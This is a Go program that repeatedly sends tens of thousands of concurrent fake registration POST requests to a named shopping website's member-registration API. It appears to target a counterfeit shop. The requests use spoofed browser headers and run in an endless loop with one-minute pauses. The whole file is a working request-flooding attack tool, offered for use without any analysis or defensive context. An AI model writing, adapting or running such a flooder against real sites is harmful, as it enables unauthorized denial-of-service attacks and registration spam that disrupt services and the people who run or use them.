package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

func main() {
	url := "https://www.louisvuittonindo.shop/user/api/member/register?lang=null"

	payload := map[string]string{
		"inviteCode": "153801",
		"userName":   "153801000",
		"name":       "153801000",
		"mobile":     "153801000",
		"password":   "153801000",
		"verifyCode": "",
		"uuid":       "4ef45845-7825-481b-927f-738d6952a7df",
		"checkCode":  "9e7d5bff26b608b45b95f66c9828aff2",
	}
	for {
		for i := 0; i < 10000; i++ {
			go runCroot(url, payload)
		}
		// Jeda 1 menit sebelum menunggu input pengguna
		fmt.Println("Pausing for 1 minute...")
		time.Sleep(1 * time.Minute)
	}
	// Tunggu hingga pengguna menekan Enter
	//fmt.Println("Press Enter to exit...")
	//fmt.Scanln()
}

func runCroot(url string, payload interface{}) {
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling payload:", err)
		return
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payloadBytes))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Content-Length", "196")
	req.Header.Set("Cookie", "lang=in_ID; _lang=null")
	req.Header.Set("Lang", "null")
	req.Header.Set("Origin", "https://www.louisvuittonindo.shop")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Priority", "u=1, i")
	req.Header.Set("Referer", "https://www.louisvuittonindo.shop/")
	req.Header.Set("Sec-Ch-Ua", `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}

	fmt.Println("Response Status:", resp.Status)
	fmt.Println("Response Body:", string(body))
}
